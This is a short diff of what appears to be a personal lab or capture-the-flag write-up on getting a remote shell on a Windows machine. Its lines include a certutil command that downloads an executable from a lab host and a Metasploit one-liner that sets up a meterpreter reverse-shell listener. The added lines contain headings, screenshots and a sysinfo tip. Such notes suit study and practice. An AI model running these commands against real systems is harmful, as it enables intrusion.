@@ -105,4 +105,9 @@ certutil -urlcache -split -f http://10.9.0.124:9090/clown.exe C:\Windows\Temp\sh
 ```bash
 msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.9.0.124; set lport 7777; exploit"
 ```
-
+## Run the Payload (NC Shell)
+![[Pasted image 20251018212616.png]]
+## Meterpreter Shell Captured
+![[Pasted image 20251018212634.png]]
+# Finding the OS Version of the Windows Machine
+In meterpreter use the ***sysinfo*** command
